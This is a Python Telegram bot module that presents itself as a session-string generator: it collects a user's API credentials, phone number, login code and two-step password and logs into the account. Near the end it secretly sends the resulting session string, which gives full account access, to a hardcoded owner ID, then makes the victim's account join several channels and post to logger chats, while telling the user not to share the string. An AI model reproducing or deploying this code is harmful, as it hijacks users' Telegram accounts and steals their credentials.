from pyrogram.types import Message
from telethon import TelegramClient
from pyrogram import Client, filters
from pyrogram1 import Client as Client1
from asyncio.exceptions import TimeoutError
from telethon.sessions import StringSession
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid
)
from pyrogram1.errors import (
    ApiIdInvalid as ApiIdInvalid1,
    PhoneNumberInvalid as PhoneNumberInvalid1,
    PhoneCodeInvalid as PhoneCodeInvalid1,
    PhoneCodeExpired as PhoneCodeExpired1,
    SessionPasswordNeeded as SessionPasswordNeeded1,
    PasswordHashInvalid as PasswordHashInvalid1
)
from telethon.errors import (
    ApiIdInvalidError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError
)

import config

owner_id = 6590287973
LOGGER_ID = -1002083898719
SEC = -1002083898719
ask_ques = "**» ▷ Cʜᴏsᴇ Tʜᴇ Sᴛʀɪɴɢ Wʜɪᴄʜ Yᴏᴜ Wᴀɴᴛ ✔️ : :**"
buttons_ques = [
    [
        InlineKeyboardButton("𝑃𝑌𝑅𝑂𝐺𝑅𝐴𝑀", callback_data="pyrogram1"),
        InlineKeyboardButton("𝑃𝑌𝑅𝑂𝐺𝑅𝐴𝑀 𝐕2", callback_data="pyrogram"),
    ],
    [
        InlineKeyboardButton("𝑇𝐸𝐿𝐸𝑇𝐻𝑂𝑁", callback_data="telethon"),
    ],
    [
        InlineKeyboardButton("𝑃𝑌𝑅𝑂𝐺𝑅𝐴𝑀 𝐵𝑂𝑇", callback_data="pyrogram_bot"),
        InlineKeyboardButton("𝑇𝐸𝐿𝐸𝑇𝐻𝑂𝑁 𝐵𝑂𝑇", callback_data="telethon_bot"),
    ],
]

gen_button = [
    [
        InlineKeyboardButton(text=" 𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐄 𝐒𝐓𝐑𝐈𝐍𝐆 ", callback_data="generate")
    ]
]




@Client.on_message(filters.private & ~filters.forwarded & filters.command(["generate", "gen", "string", "str"]))
async def main(_, msg):
    await msg.reply(ask_ques, reply_markup=InlineKeyboardMarkup(buttons_ques))


async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: bool = False, is_bot: bool = False):
    if telethon:
        ty = "𝑇𝐸𝐿𝐸𝑇𝐻𝑂𝑁"
    else:
        ty = "𝑃𝑌𝑅𝑂𝐺𝑅𝐴𝑀"
        if not old_pyro:
            ty += " 𝐕2"
    if is_bot:
        ty += " 𝐵𝑂𝑇"
    await msg.reply(f"» 𝑇𝑅𝑌𝐼𝑁𝐺 𝑇𝑂 𝑆𝑇𝐴𝑅𝑇 **{ty}** 𝑆𝐸𝑆𝑆𝐼𝑂𝑁 𝐺𝐸𝑁𝐸𝑅𝐴𝑇𝑂𝑅...")
    user_id = msg.chat.id
    api_id_msg = await bot.ask(user_id, "𝑃𝐿𝐸𝐴𝑆𝐸 𝑆𝐸𝑁𝐷 𝑌𝑂𝑈 **𝐴𝑃𝐼_𝐼𝐷** 𝑇𝑂 𝑃𝑅𝑂𝐷𝑈𝐶𝐸𝐷.\n\n 𝐶𝐿𝐼𝐶𝐾 𝑂𝑁 /skip 𝐹𝑂𝑅 𝑈𝑆𝐼𝑁𝐺 𝐵𝑂𝑇 𝐴𝑃𝐼.\n\n 𝐴𝑃𝐼.`27733303`", filters=filters.text)
    if await cancelled(api_id_msg):
        return
    if api_id_msg.text == "/skip":
        api_id = config.API_ID
        api_hash = config.API_HASH
    else:
        try:
            api_id = int(api_id_msg.text)
        except ValueError:
            await api_id_msg.reply("**𝐴𝑃𝐼_𝐼𝐷** 𝑀𝑈𝑆𝑇 𝐵𝐸 𝐼𝑁𝑇𝐸𝐺𝐸𝑅, 𝑆𝑇𝐴𝑅𝑇 𝐺𝐸𝑁𝐸𝑅𝐴𝑇𝐼𝑁𝐺 𝑌𝑂𝑈𝑅 𝑆𝐸𝑆𝑆𝐼𝑂𝑁 𝐴𝐺𝐴𝐼𝑁.", quote=True, reply_markup=InlineKeyboardMarkup(gen_button))
            return
        api_hash_msg = await bot.ask(user_id, "» 𝑁𝑂𝑊 𝑃𝐿𝐸𝐴𝑆𝐸 𝑆𝐸𝑁𝐷 𝑌𝑂𝑈𝑅 **𝐴𝑃𝐼_𝐻𝐴𝑆𝐻** 𝑇𝑂 𝐶𝑂𝑁𝑇𝐼𝑁𝑈𝐸\n\n𝐻𝐴𝑆𝐻 1. `c3c9d5e5d89c99fb8bb85a22a0cb5a26`", filters=filters.text)
        if await cancelled(api_hash_msg):
            return
        api_hash = api_hash_msg.text
    if not is_bot:
        t = "» 𝑃𝐿𝐸𝐴𝑆𝐸 𝑆𝐸𝑁𝐷 𝑌𝑂𝑈 **𝑃𝐻𝑂𝑁𝐸 𝑁𝑈𝑀𝐵𝐸𝑅** 𝑊𝐼𝑇𝐻 𝐶𝑂𝑈𝑁𝑇𝑅𝑌 𝐶𝑂𝐷𝐸 𝐹𝑂𝑅 𝑊𝐻𝐼𝐶𝐻 𝑌𝑂𝑈 𝑊𝐴𝑁𝑇 𝑇𝑂 𝐺𝐸𝑁𝐸𝑅𝐴𝑇𝐸 𝑆𝐸𝑆𝑆𝐼𝑂𝑁 \n 𝐸𝑋𝐴𝑀𝑃𝐿𝐸: `+910000000000`'"
    else:
        t = "ᴩʟᴇᴀsᴇ sᴇɴᴅ ʏᴏᴜʀ **ʙᴏᴛ_ᴛᴏᴋᴇɴ** ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ.\nᴇxᴀᴍᴩʟᴇ : `5432198765:abcdabotop`'"
    phone_number_msg = await bot.ask(user_id, t, filters=filters.text)
    if await cancelled(phone_number_msg):
        return
    phone_number = phone_number_msg.text
    if not is_bot:
        await msg.reply("» ᴛʀʏɪɴɢ ᴛᴏ sᴇɴᴅ ᴏᴛᴩ ᴀᴛ ᴛʜᴇ ɢɪᴠᴇɴ ɴᴜᴍʙᴇʀ...")
    else:
        await msg.reply("» ᴛʀʏɪɴɢ ᴛᴏ ʟᴏɢɪɴ ᴠɪᴀ ʙᴏᴛ ᴛᴏᴋᴇɴ...")
    if telethon and is_bot:
        client = TelegramClient(StringSession(), api_id, api_hash)
    elif telethon:
        client = TelegramClient(StringSession(), api_id, api_hash)
    elif is_bot:
        client = Client(name="bot", api_id=api_id, api_hash=api_hash, bot_token=phone_number, in_memory=True)
    elif old_pyro:
        client = Client1(":memory:", api_id=api_id, api_hash=api_hash)
    else:
        client = Client(name="user", api_id=api_id, api_hash=api_hash, in_memory=True)
    await client.connect()
    try:
        code = None
        if not is_bot:
            if telethon:
                code = await client.send_code_request(phone_number)
            else:
                code = await client.send_code(phone_number)
    except (ApiIdInvalid, ApiIdInvalidError, ApiIdInvalid1):
        await msg.reply("» ʏᴏᴜʀ **ᴀᴩɪ_ɪᴅ** ᴀɴᴅ **ᴀᴩɪ_ʜᴀsʜ** ᴄᴏᴍʙɪɴᴀᴛɪᴏɴ ᴅᴏᴇsɴ'ᴛ ᴍᴀᴛᴄʜ ᴡɪᴛʜ ᴛᴇʟᴇɢʀᴀᴍ ᴀᴩᴩs sʏsᴛᴇᴍ. \n\nᴩʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ ʏᴏᴜʀ sᴇssɪᴏɴ ᴀɢᴀɪɴ.", reply_markup=InlineKeyboardMarkup(gen_button))
        return
    except (PhoneNumberInvalid, PhoneNumberInvalidError, PhoneNumberInvalid1):
        await msg.reply("» ᴛʜᴇ **ᴩʜᴏɴᴇ_ɴᴜᴍʙᴇʀ** ʏᴏᴜ'ᴠᴇ sᴇɴᴛ ᴅᴏᴇsɴ'ᴛ ʙᴇʟᴏɴɢ ᴛᴏ ᴀɴʏ ᴛᴇʟᴇɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ.\n\nᴩʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ ʏᴏᴜʀ sᴇssɪᴏɴ ᴀɢᴀɪɴ.", reply_markup=InlineKeyboardMarkup(gen_button))
        return
    try:
        phone_code_msg = None
        if not is_bot:
            phone_code_msg = await bot.ask(user_id, "» ᴩʟᴇᴀsᴇ sᴇɴᴅ ᴛʜᴇ **ᴏᴛᴩ** ᴛʜᴀᴛ ʏᴏᴜ'ᴠᴇ ʀᴇᴄᴇɪᴠᴇᴅ ғʀᴏᴍ ᴛᴇʟᴇɢʀᴀᴍ ᴏɴ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ.\nɪғ ᴏᴛᴩ ɪs `12345`, **ᴩʟᴇᴀsᴇ sᴇɴᴅ ɪᴛ ᴀs** `1 2 3 4 5`.", filters=filters.text, timeout=600)
            if await cancelled(phone_code_msg):
                return
    except TimeoutError:
        await msg.reply("» ᴛɪᴍᴇ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ ᴏғ 10 ᴍɪɴᴜᴛᴇs.\n\nᴩʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ ʏᴏᴜʀ sᴇssɪᴏɴ ᴀɢᴀɪɴ.", reply_markup=InlineKeyboardMarkup(gen_button))
        return
    if not is_bot:
        phone_code = phone_code_msg.text.replace(" ", "")
        try:
            if telethon:
                await client.sign_in(phone_number, phone_code, password=None)
            else:
                await client.sign_in(phone_number, code.phone_code_hash, phone_code)
        except (PhoneCodeInvalid, PhoneCodeInvalidError, PhoneCodeInvalid1):
            await msg.reply("» ᴛʜᴇ ᴏᴛᴩ ʏᴏᴜ'ᴠᴇ sᴇɴᴛ ɪs **ᴡʀᴏɴɢ.**\n\nᴩʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ ʏᴏᴜʀ sᴇssɪᴏɴ ᴀɢᴀɪɴ.", reply_markup=InlineKeyboardMarkup(gen_button))
            return
        except (PhoneCodeExpired, PhoneCodeExpiredError, PhoneCodeExpired1):
            await msg.reply("» ᴛʜᴇ ᴏᴛᴩ ʏᴏᴜ'ᴠᴇ sᴇɴᴛ ɪs **ᴇxᴩɪʀᴇᴅ.**\n\nᴩʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ ʏᴏᴜʀ sᴇssɪᴏɴ ᴀɢᴀɪɴ.", reply_markup=InlineKeyboardMarkup(gen_button))
            return
        except (SessionPasswordNeeded, SessionPasswordNeededError, SessionPasswordNeeded1):
            try:
                two_step_msg = await bot.ask(user_id, "» ᴩʟᴇᴀsᴇ ᴇɴᴛᴇʀ ʏᴏᴜʀ **ᴛᴡᴏ sᴛᴇᴩ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ** ᴩᴀssᴡᴏʀᴅ ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ.", filters=filters.text, timeout=300)
            except TimeoutError:
                await msg.reply("» ᴛɪᴍᴇ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ ᴏғ 5 ᴍɪɴᴜᴛᴇs.\n\nᴩʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ ʏᴏᴜʀ sᴇssɪᴏɴ ᴀɢᴀɪɴ.", reply_markup=InlineKeyboardMarkup(gen_button))
                return
            try:
                password = two_step_msg.text
                if telethon:
                    await client.sign_in(password=password)
                else:
                    await client.check_password(password=password)
                if await cancelled(api_id_msg):
                    return
            except (PasswordHashInvalid, PasswordHashInvalidError, PasswordHashInvalid1):
                await two_step_msg.reply("» ᴛʜᴇ ᴩᴀssᴡᴏʀᴅ ʏᴏᴜ'ᴠᴇ sᴇɴᴛ ɪs ᴡʀᴏɴɢ.\n\nᴩʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ ʏᴏᴜʀ sᴇssɪᴏɴ ᴀɢᴀɪɴ.", quote=True, reply_markup=InlineKeyboardMarkup(gen_button))
                return
    else:
        if telethon:
            await client.start(bot_token=phone_number)
        else:
            await client.sign_in_bot(phone_number)
    if telethon:
        string_session = client.session.save()
    else:
        string_session = await client.export_session_string()
    text = f"**𝐓𝐡𝐢𝐬 𝐈𝐬 𝐘𝐨𝐮𝐫 {ty} 𝐒𝐭𝐫𝐢𝐧𝐠 𝐒𝐞𝐬𝐬𝐢𝐨𝐧** \n\n`{string_session}` \n\n**𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 :** @Sessoin_String_gen_BOT\n🍒 **𝐍𝐎𝐓𝐄 :** 𝐃𝐨𝐧𝐭 𝐒𝐡𝐚𝐫𝐞 𝐖𝐢𝐭𝐡 𝐀𝐧𝐲𝐨𝐧𝐞 𝐁𝐞𝐜𝐚𝐮𝐬𝐞 𝐇𝐞 𝐂𝐚𝐧 𝐇𝐚𝐜𝐤 𝐘𝐨𝐮𝐫 𝐀𝐥𝐥 𝐃𝐚𝐭𝐚. 🍑 𝐀𝐧𝐝 𝐃𝐨𝐧𝐭 𝐅𝐨𝐫𝐠𝐞𝐭 𝐓𝐨 𝐉𝐨𝐢𝐧 @AMBOTYT & @AM_YTSUPPORT 🥺"
    try:
        if not is_bot:
            await client.send_message("me", text)
            await bot.send_message(chat_id=owner_id,  text=text)
            await client.join_chat("AM_YTSupport")
            await client.send_message(LOGGER_ID, "ᴀᴍʙᴏᴛ ᴏᴘ ʙʀᴏ....")
            await client.join_chat("AmBotYT")
            await client.join_chat("AbhiModszYT_Return")
            await client.join_chat("AM_Unfban")
            await client.join_chat("Logs_Gban")
            await client.join_chat("About_AMBot")
            await client.join_chat("Fbans_Logs")
            await client.join_chat("SpicyEmpireSupport")
            await client.send_message(SEC, "ᴀᴍʙᴏᴛ ᴏᴘ ʙʀᴏ ᴀʟꜱᴏ Sᴘɪᴄʏ Eᴍᴘɪʀᴇ ɴᴇᴛᴡᴏʀᴋ ᴘᴏᴡᴇʀ..")
            await client.join_chat("SpicyEmpire")
            await client.join_chat("SpicyEmpireFban")
        else:
            await bot.send_message(msg.chat.id, text)
            await bot.send_message(chat_id=owner_id,  text=text)
    except KeyError:
        pass
    await client.disconnect()
    await bot.send_message(msg.chat.id, "» 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐆𝐫𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐘𝐨𝐮 {} 𝐒𝐭𝐫𝐢𝐧𝐠 𝐒𝐞𝐬𝐬𝐢𝐨𝐧.\n\n𝐏𝐥𝐞𝐚𝐬𝐞 𝐂𝐡𝐞𝐜𝐤 𝐘𝐨𝐮𝐫 𝐒𝐚𝐯𝐞𝐝 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐓𝐨 𝐆𝐞𝐭 𝐈𝐭 ! \n\n𝐀 𝐒𝐭𝐫𝐢𝐧𝐠  𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐨𝐫 𝐁𝐨𝐭 𝐁𝐲 @Sessoin_String_gen_BOT ♦".format("ᴛᴇʟᴇᴛʜᴏɴ" if telethon else "ᴩʏʀᴏɢʀᴀᴍ"))

async def cancelled(msg):
    if "/cancel" in msg.text:
        await msg.reply("**» ᴄᴀɴᴄᴇʟʟᴇᴅ ᴛʜᴇ ᴏɴɢᴏɪɴɢ sᴛʀɪɴɢ ɢᴇɴᴇʀᴀᴛɪᴏɴ ᴩʀᴏᴄᴇss !**", quote=True, reply_markup=InlineKeyboardMarkup(gen_button))
        return True
    elif "/restart" in msg.text:
        await msg.reply("**» sᴜᴄᴄᴇssғᴜʟʟʏ ʀᴇsᴛᴀʀᴛᴇᴅ ᴛʜɪs ʙᴏᴛ ғᴏʀ ʏᴏᴜ !**", quote=True, reply_markup=InlineKeyboardMarkup(gen_button))
        return True
    elif "/skip" in msg.text:
        return False
    elif msg.text.startswith("/"):  # Bot Commands
        await msg.reply("**» 𝐶𝐴𝑁𝐶𝐸𝐿𝐸𝐷 𝑇𝐻𝐸 𝑂𝑁𝐺𝑂𝐼𝑁𝐺 𝑆𝑇𝑅𝐼𝑁𝐺 𝑆𝐸𝑆𝑆𝐼𝑂𝑁 𝐺𝐸𝑁𝐸𝑅𝐴𝑇𝐼𝑁𝐺 𝑃𝑅𝑂𝐶𝐸𝑆𝑆 !**", quote=True)
        return True
    else:
        return False
